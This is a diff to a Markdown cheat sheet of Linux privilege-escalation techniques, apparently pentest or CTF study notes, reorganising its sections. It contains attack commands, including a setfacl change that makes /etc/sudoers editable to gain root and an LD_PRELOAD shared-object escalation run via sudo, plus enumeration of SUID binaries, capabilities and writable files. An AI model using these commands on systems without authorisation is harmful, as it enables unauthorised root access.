@@ -1,34 +1,36 @@
-# Sudoers
-```shell-session
-$ sudo -l
-```
-# Group Memberships
+# Permission-based
+## Group Memberships
 Interesting groups to be part of:
 - LXC / LXD
 - Docker
 - Disk
 - ADM
-# Cron Jobs
-1. **`/etc/crontab`**
-2. **`/etc/cron.d`**
-3. **`/etc/cron.daily/`**
-4. **`/var/spool/cron/crontabs/root`**
-# Processes
-Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
-# User Privileges
+## Capabilities
+Grants specific privileges(s) to processes.
+### Enumerate Capabilities
+```shell-session
+$ find $(echo $PATH | tr ':' ' ') -type f -exec getcap {} \;
+```
+## User Privileges
 1. Sudo
 2. SUID
 3. Windows Token Privileges
-## Sudoers
+### Sudo
+Check for sudo abuse.
+```shell-session
+$ sudo -l
+```
+### Sudoers
 If the file `etc/sudoers` /could be made editable (for example using `setfacl`, add sudo privileges directly and `sudo su` to get root.
 ```bash
 setfacl -m u:$USER:$perm /etc/sudoers
 ```
 if `setfacl` can be run as sudo from low_priv user.
-## Exposed Credentials
-* bash_history
-* mysql_history
-# SSH Keys
+## Writeable Files/Directories
+```shell-session
+$ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
+```
+## SSH Keys
 If we have read/write access on **`.ssh`**  directory, we can get/create SSH connection.
 
 Generate public-private key and paste the public in server
@@ -56,16 +58,7 @@ void _init() {
 $ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
 $ sudo LD_PRELOAD=exploit.so <COMMAND>
 ```
-# Capabilities
-Grants specific privileges(s) to processes.
-## Enumerate Capabilities
-```shell-session
-$ find $(echo $PATH | tr ':' ' ') -type f -exec getcap {} \;
-```
-# Writeable Files/Directories
-```shell-session
-$ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
-```
+
 # Information Gathering
 ## OS Release
 ```shell-session
@@ -115,17 +108,17 @@ $ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/n
 ```shell-session
 $ find / -user root -perm -<4/6>000 -exec ls -ldb {} \; 2>/dev/null
 ```
+## Processes
+Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
 # Service-based
 ## Logrotate
 ## LXD
 ## Docker
 ## Cron
-
-# Extras
-- All writable files by us
-```shell-session
-$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
-```
+1. **`/etc/crontab`**
+2. **`/etc/cron.d`**
+3. **`/etc/cron.daily/`**
+4. **`/var/spool/cron/crontabs/root`**
 # Wildcard Abuse
 When certain applications are run with wildcards, they can be abused:
 Example:
